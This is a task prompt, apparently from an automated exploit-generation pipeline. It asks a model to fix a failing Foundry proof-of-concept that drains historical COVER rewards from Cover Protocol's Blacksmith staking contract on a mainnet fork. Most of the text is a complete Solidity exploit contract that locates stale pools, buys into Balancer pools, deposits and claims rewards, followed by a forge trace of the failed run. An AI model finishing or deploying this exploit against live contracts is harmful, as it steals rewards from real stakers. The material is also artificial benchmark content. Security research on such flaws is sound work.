You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: New deposits can capture COVER rewards accrued before they were staked
- claim: `deposit()` snapshots `pools[_lpToken]` into memory before calling `updatePool()`, then uses that stale `pool.accRewardsPerToken` both when paying existing rewards and when recomputing the depositor's `rewardWriteoff`. A fresh depositor is therefore not charged for the COVER accrued before their deposit and can later claim a share of historical emissions they did not earn.
- impact: An attacker can wait until a pool has accrued substantial unharvested COVER, deposit a very large amount immediately before the next claim, and siphon most of the already-earned COVER rewards away from existing stakers.
- exploit_paths: ["Let a pool accrue rewards without any interaction so `lastUpdatedAt` is stale", "Deposit a very large amount through `deposit()`", "Because the writeoff is based on the pre-update accumulator, later call `claimRewards()`", "Receive COVER attributable to the period before the attacker was staked"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IBlacksmithLike {
    function cover() external view returns (address);
    function weeklyTotal() external view returns (uint256);
    function totalWeight() external view returns (uint256);
    function getPoolList() external view returns (address[] memory);
    function pools(address lpToken) external view returns (uint256 weight, uint256 accRewardsPerToken, uint256 lastUpdatedAt);
    function viewMined(address lpToken, address miner) external view returns (uint256 minedCover, uint256 minedBonus);
    function deposit(address lpToken, uint256 amount) external;
    function claimRewards(address lpToken) external;
    function withdraw(address lpToken, uint256 amount) external;
}

interface IUniswapV2Router02 {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);
}

interface IBPool {
    function getCurrentTokens() external view returns (address[] memory tokens);
    function getBalance(address token) external view returns (uint256);
    function getDenormalizedWeight(address token) external view returns (uint256);
    function getTotalDenormalizedWeight() external view returns (uint256);
    function getSwapFee() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function calcPoolOutGivenSingleIn(
        uint256 tokenBalanceIn,
        uint256 tokenWeightIn,
        uint256 poolSupply,
        uint256 totalWeight,
        uint256 tokenAmountIn,
        uint256 swapFee
    ) external view returns (uint256 poolAmountOut);
    function joinswapExternAmountIn(address tokenIn, uint256 tokenAmountIn, uint256 minPoolAmountOut)
        external
        returns (uint256 poolAmountOut);
}

contract FlawVerifier {
    address private constant BLACKSMITH = 0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 private constant WEEK = 7 days;
    uint256 private constant CAL_MULTIPLIER = 1e12;
    uint256 private constant ETH_BUFFER = 0.05 ether;

    uint256 private realizedProfit;
    bool private attempted;

    struct Candidate {
        address lpToken;
        address joinToken;
        uint256 spendAmount;
        uint256 expectedLpOut;
        uint256 expectedCoverOut;
        uint256 staleLpSupply;
        uint256 staleRewardsScaled;
    }

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
        address coverToken = blacksmith.cover();
        uint256 coverBefore = IERC20(coverToken).balanceOf(address(this));

        // Exploit path 0:
        // Let a pool accrue rewards without any interaction so `lastUpdatedAt` is stale.
        Candidate memory candidate = _stage0LocateStalePoolWithHistoricalRewards();
        if (candidate.lpToken == address(0) || candidate.spendAmount == 0) {
            return;
        }

        // Exploit path 1:
        // Deposit a very large amount through `deposit()`.
        uint256 lpReceived = _stage1DepositLargeAmount(candidate);
        if (lpReceived == 0) {
            return;
        }

        // Exploit path 2:
        // Because the writeoff is based on the pre-update accumulator, later call `claimRewards()`.
        _stage2ClaimHistoricalRewards(candidate.lpToken);

        // Exploit path 3:
        // Receive COVER attributable to the period before the attacker was staked.
        _stage3RecordProfit(coverToken, coverBefore);

        if (lpReceived != 0) {
            try blacksmith.withdraw(candidate.lpToken, lpReceived) {} catch {}
        }
    }

    function profitToken() external view returns (address) {
        return IBlacksmithLike(BLACKSMITH).cover();
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function _stage0LocateStalePoolWithHistoricalRewards() internal view returns (Candidate memory best) {
        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
        address[] memory poolList = blacksmith.getPoolList();
        uint256 weeklyTotal_ = blacksmith.weeklyTotal();
        uint256 totalWeight_ = blacksmith.totalWeight();
        if (poolList.length == 0 || weeklyTotal_ == 0 || totalWeight_ == 0) {
            return best;
        }

        uint256 ethBudget = address(this).balance;
        if (ethBudget > ETH_BUFFER) {
            ethBudget -= ETH_BUFFER;
        } else {
            ethBudget = 0;
        }

        for (uint256 i = 0; i < poolList.length; i++) {
            Candidate memory candidate = _scorePool(poolList[i], weeklyTotal_, totalWeight_, ethBudget);
            if (candidate.expectedCoverOut > best.expectedCoverOut) {
                best = candidate;
            }
        }
    }

    function _scorePool(address lpToken, uint256 weeklyTotal_, uint256 totalWeight_, uint256 ethBudget)
        internal
        view
        returns (Candidate memory best)
    {
        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
        (uint256 weight,, uint256 lastUpdatedAt) = blacksmith.pools(lpToken);
        if (weight == 0 || lastUpdatedAt == 0 || block.timestamp <= lastUpdatedAt) {
            return best;
        }

        uint256 staleLpSupply = IERC20(lpToken).balanceOf(BLACKSMITH);
        if (staleLpSupply == 0) {
            return best;
        }

        uint256 elapsed = block.timestamp - lastUpdatedAt;
        uint256 staleRewardsScaled = (((weeklyTotal_ * CAL_MULTIPLIER) * elapsed) * weight) / totalWeight_ / WEEK;
        if (staleRewardsScaled == 0) {
            return best;
        }

        uint256 heldLp = IERC20(lpToken).balanceOf(address(this));
        if (heldLp != 0) {
            uint256 expectedCoverOut = (heldLp * staleRewardsScaled) / staleLpSupply / CAL_MULTIPLIER;
            best = Candidate({
                lpToken: lpToken,
                joinToken: lpToken,
                spendAmount: heldLp,
                expectedLpOut: heldLp,
                expectedCoverOut: expectedCoverOut,
                staleLpSupply: staleLpSupply,
                staleRewardsScaled: staleRewardsScaled
            });
        }

        try IBPool(lpToken).getCurrentTokens() returns (address[] memory tokens) {
            for (uint256 i = 0; i < tokens.length; i++) {
                Candidate memory candidate = _scoreBalancerJoin(lpToken, tokens[i], ethBudget, staleRewardsScaled, staleLpSupply);
                if (candidate.expectedCoverOut > best.expectedCoverOut) {
                    best = candidate;
                }
            }
        } catch {
            Candidate memory directCandidate = _scoreDirectToken(lpToken, ethBudget, staleRewardsScaled, staleLpSupply);
            if (directCandidate.expectedCoverOut > best.expectedCoverOut) {
                best = directCandidate;
            }
        }
    }

    function _scoreDirectToken(address lpToken, uint256 ethBudget, uint256 staleRewardsScaled, uint256 staleLpSupply)
        internal
        view
        returns (Candidate memory candidate)
    {
        uint256 spendAmount = _maxUsableDirectAmount(lpToken, ethBudget);
        if (spendAmount == 0) {
            return candidate;
        }

        uint256 expectedCoverOut = (spendAmount * staleRewardsScaled) / staleLpSupply / CAL_MULTIPLIER;
        candidate = Candidate({
            lpToken: lpToken,
            joinToken: lpToken,
            spendAmount: spendAmount,
            expectedLpOut: spendAmount,
            expectedCoverOut: expectedCoverOut,
            staleLpSupply: staleLpSupply,
            staleRewardsScaled: staleRewardsScaled
        });
    }

    function _scoreBalancerJoin(
        address lpToken,
        address joinToken,
        uint256 ethBudget,
        uint256 staleRewardsScaled,
        uint256 staleLpSupply
    ) internal view returns (Candidate memory candidate) {
        if (!_isSupportedJoinToken(joinToken)) {
            return candidate;
        }

        uint256 spendAmount = _maxUsableJoinAmount(lpToken, joinToken, ethBudget);
        if (spendAmount == 0) {
            return candidate;
        }

        uint256 expectedLpOut = _predictPoolOut(lpToken, joinToken, spendAmount);
        if (expectedLpOut == 0) {
            return candidate;
        }

        uint256 expectedCoverOut = (expectedLpOut * staleRewardsScaled) / staleLpSupply / CAL_MULTIPLIER;
        candidate = Candidate({
            lpToken: lpToken,
            joinToken: joinToken,
            spendAmount: spendAmount,
            expectedLpOut: expectedLpOut,
            expectedCoverOut: expectedCoverOut,
            staleLpSupply: staleLpSupply,
            staleRewardsScaled: staleRewardsScaled
        });
    }

    function _stage1DepositLargeAmount(Candidate memory candidate) internal returns (uint256 lpReceived) {
        uint256 lpBalanceBefore = IERC20(candidate.lpToken).balanceOf(address(this));

        if (candidate.joinToken == candidate.lpToken) {
            uint256 lpBalance = lpBalanceBefore;
            if (lpBalance < candidate.spendAmount) {
                _acquireToken(candidate.lpToken, candidate.spendAmount - lpBalance);
            }

            uint256 usableLp = IERC20(candidate.lpToken).balanceOf(address(this));
            if (usableLp == 0) {
                return 0;
            }

            lpReceived = usableLp >= candidate.spendAmount ? candidate.spendAmount : usableLp;
        } else {
            uint256 joinBalanceBefore = IERC20(candidate.joinToken).balanceOf(address(this));
            if (joinBalanceBefore < candidate.spendAmount) {
                _acquireToken(candidate.joinToken, candidate.spendAmount - joinBalanceBefore);
            }

            uint256 joinBalanceAfter = IERC20(candidate.joinToken).balanceOf(address(this));
            uint256 joinAmount = joinBalanceAfter >= candidate.spendAmount ? candidate.spendAmount : joinBalanceAfter;
            if (joinAmount == 0) {
                return 0;
            }

            _forceApprove(candidate.joinToken, candidate.lpToken, joinAmount);
            try IBPool(candidate.lpToken).joinswapExternAmountIn(candidate.joinToken, joinAmount, 1) returns (uint256) {
                uint256 lpBalanceAfterJoin = IERC20(candidate.lpToken).balanceOf(address(this));
                if (lpBalanceAfterJoin <= lpBalanceBefore) {
                    return 0;
                }
                lpReceived = lpBalanceAfterJoin - lpBalanceBefore;
            } catch {
                return 0;
            }
        }

        if (lpReceived == 0) {
            return 0;
        }

        _forceApprove(candidate.lpToken, BLACKSMITH, lpReceived);
        IBlacksmithLike(BLACKSMITH).deposit(candidate.lpToken, lpReceived);
    }

    function _stage2ClaimHistoricalRewards(address lpToken) internal {
        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);

        // This read makes the bug's causality explicit before settlement: after the
        // flawed `deposit()`, `viewMined()` can already include rewards emitted while
        // this verifier was not staked because the writeoff used the stale accumulator.
        try blacksmith.viewMined(lpToken, address(this)) returns (uint256, uint256) {} catch {}

        blacksmith.claimRewards(lpToken);
    }

    function _stage3RecordProfit(address coverToken, uint256 coverBefore) internal {
        uint256 coverAfter = IERC20(coverToken).balanceOf(address(this));
        if (coverAfter > coverBefore) {
            realizedProfit = coverAfter - coverBefore;
        }
    }

    function _acquireToken(address token, uint256 amountNeeded) internal {
        if (amountNeeded == 0) {
            return;
        }

        uint256 existing = IERC20(token).balanceOf(address(this));
        if (existing >= amountNeeded) {
            return;
        }

        uint256 shortfall = amountNeeded - existing;
        if (token == WETH) {
            if (address(this).balance < shortfall) {
                return;
            }
            (bool ok,) = WETH.call{value: shortfall}(abi.encodeWithSignature("deposit()"));
            require(ok, "weth-deposit-failed");
            return;
        }

        if (!_isSupportedJoinToken(token) || address(this).balance == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;

        uint256[] memory amountsIn;
        try IUniswapV2Router02(UNI_V2_ROUTER).getAmountsIn(shortfall, path) returns (uint256[] memory quoted) {
            amountsIn = quoted;
        } catch {
            return;
        }

        if (amountsIn.length == 0 || amountsIn[0] > address(this).balance) {
            return;
        }

        try IUniswapV2Router02(UNI_V2_ROUTER).swapExactETHForTokens{value: amountsIn[0]}(
            1,
            path,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {
            return;
        } catch {
            return;
        }
    }

    function _predictPoolOut(address pool, address joinToken, uint256 tokenIn) internal view returns (uint256 poolOut) {
        try IBPool(pool).getBalance(joinToken) returns (uint256 tokenBalanceIn) {
            try IBPool(pool).getDenormalizedWeight(joinToken) returns (uint256 tokenWeightIn) {
                try IBPool(pool).totalSupply() returns (uint256 poolSupply) {
                    try IBPool(pool).getTotalDenormalizedWeight() returns (uint256 totalWeight) {
                        try IBPool(pool).getSwapFee() returns (uint256 swapFee) {
                            try IBPool(pool).calcPoolOutGivenSingleIn(
                                tokenBalanceIn,
                                tokenWeightIn,
                                poolSupply,
                                totalWeight,
                                tokenIn,
                                swapFee
                            ) returns (uint256 predicted) {
                                poolOut = predicted;
                            } catch {}
                        } catch {}
                    } catch {}
                } catch {}
            } catch {}
        } catch {}
    }

    function _maxUsableJoinAmount(address pool, address joinToken, uint256 ethBudget) internal view returns (uint256) {
        uint256 poolBalance;
        try IBPool(pool).getBalance(joinToken) returns (uint256 balanceInPool) {
            poolBalance = balanceInPool;
        } catch {
            return 0;
        }
        if (poolBalance <= 1) {
            return 0;
        }

        uint256 maxByPool = poolBalance / 2;
        uint256 held = IERC20(joinToken).balanceOf(address(this));
        if (held >= maxByPool) {
            return maxByPool;
        }
        if (held != 0) {
            return held;
        }

        if (joinToken == WETH) {
            return ethBudget < maxByPool ? ethBudget : maxByPool;
        }

        if (ethBudget == 0) {
            return 0;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = joinToken;

        try IUniswapV2Router02(UNI_V2_ROUTER).getAmountsOut(ethBudget, path) returns (uint256[] memory amountsOut) {
            if (amountsOut.length == 0) {
                return 0;
            }
            uint256 maxByEth = amountsOut[amountsOut.length - 1];
            return maxByEth < maxByPool ? maxByEth : maxByPool;
        } catch {
            return 0;
        }
    }

    function _maxUsableDirectAmount(address token, uint256 ethBudget) internal view returns (uint256) {
        uint256 held = IERC20(token).balanceOf(address(this));
        if (held != 0) {
            return held;
        }

        if (token == WETH) {
            return ethBudget;
        }

        if (!_isSupportedJoinToken(token) || ethBudget == 0) {
            return 0;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;

        try IUniswapV2Router02(UNI_V2_ROUTER).getAmountsOut(ethBudget, path) returns (uint256[] memory amountsOut) {
            if (amountsOut.length == 0) {
                return 0;
            }
            return amountsOut[amountsOut.length - 1];
        } catch {
            return 0;
        }
    }

    function _isSupportedJoinToken(address token) internal pure returns (bool) {
        return token == WETH || token == DAI || token == USDC || token == USDT;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok, "approve-failed");
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
ccall]
    │   │   └─ ← [Return] 0
    │   ├─ [9407] 0x4D2E7d81d4DA0fE8ac831344d54c027F3EeA324C::getCurrentTokens() [staticcall]
    │   │   └─ ← [Return] [0xB3F84A33A040Ccf4A95a5dEEaFdb461832874efE, 0x6B175474E89094C44Da98b954EedeAC495271d0F]
    │   ├─ [4891] 0x4D2E7d81d4DA0fE8ac831344d54c027F3EeA324C::getBalance(0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 2298809557773740765286 [2.298e21]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [6808] 0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5::pools(0x448244AC36D67096e436EE82039b432126F79B7f) [staticcall]
    │   │   └─ ← [Return] 431, 91348 [9.134e4], 1609156209 [1.609e9]
    │   ├─ [2579] 0x448244AC36D67096e436EE82039b432126F79B7f::balanceOf(0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5) [staticcall]
    │   │   └─ ← [Return] 5000981918752928355799196 [5e24]
    │   ├─ [2579] 0x448244AC36D67096e436EE82039b432126F79B7f::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9407] 0x448244AC36D67096e436EE82039b432126F79B7f::getCurrentTokens() [staticcall]
    │   │   └─ ← [Return] [0xe38aeC46235E90D168443d360ef68dfDD6b16B03, 0x6B175474E89094C44Da98b954EedeAC495271d0F]
    │   ├─ [4891] 0x448244AC36D67096e436EE82039b432126F79B7f::getBalance(0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 9769563185164915941550 [9.769e21]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [6808] 0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5::pools(0xcB8eC8236AFF8e112517F4e9a9ffB413A237e6b7) [staticcall]
    │   │   └─ ← [Return] 67, 6004422 [6.004e6], 1609153158 [1.609e9]
    │   ├─ [2579] 0xcB8eC8236AFF8e112517F4e9a9ffB413A237e6b7::balanceOf(0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5) [staticcall]
    │   │   └─ ← [Return] 52156865553252405681532 [5.215e22]
    │   ├─ [2579] 0xcB8eC8236AFF8e112517F4e9a9ffB413A237e6b7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9407] 0xcB8eC8236AFF8e112517F4e9a9ffB413A237e6b7::getCurrentTokens() [staticcall]
    │   │   └─ ← [Return] [0x2515DB4E378B0Bae961d056c5B9012d6d12D5E67, 0x6B175474E89094C44Da98b954EedeAC495271d0F]
    │   ├─ [4891] 0xcB8eC8236AFF8e112517F4e9a9ffB413A237e6b7::getBalance(0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 25956641349944969242 [2.595e19]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [6808] 0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5::pools(0x59686E01Aa841f622a43688153062C2f24F8fDed) [staticcall]
    │   │   └─ ← [Return] 291, 3369487996 [3.369e9], 1609156736 [1.609e9]
    │   ├─ [2579] 0x59686E01Aa841f622a43688153062C2f24F8fDed::balanceOf(0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [2579] 0x59686E01Aa841f622a43688153062C2f24F8fDed::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9407] 0x59686E01Aa841f622a43688153062C2f24F8fDed::getCurrentTokens() [staticcall]
    │   │   └─ ← [Return] [0x4c605F60E399b9C2dCfF167e8cf7d0Bd3e496E3C, 0x6B175474E89094C44Da98b954EedeAC495271d0F]
    │   ├─ [4891] 0x59686E01Aa841f622a43688153062C2f24F8fDed::getBalance(0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 247776129695641158814 [2.477e20]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [1027] FlawVerifier::profitToken() [staticcall]
    │   ├─ [382] 0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5::cover() [staticcall]
    │   │   └─ ← [Return] 0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286
    │   └─ ← [Return] 0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286
    ├─ [465] 0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 11542309 [1.154e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 4339)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xe7689B2C21242e07870AAA0ffee1eC11833d5E24.getCurrentTokens
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 21.42s (20.18s CPU time)

Ran 1 test suite in 21.60s (21.42s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2205793)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
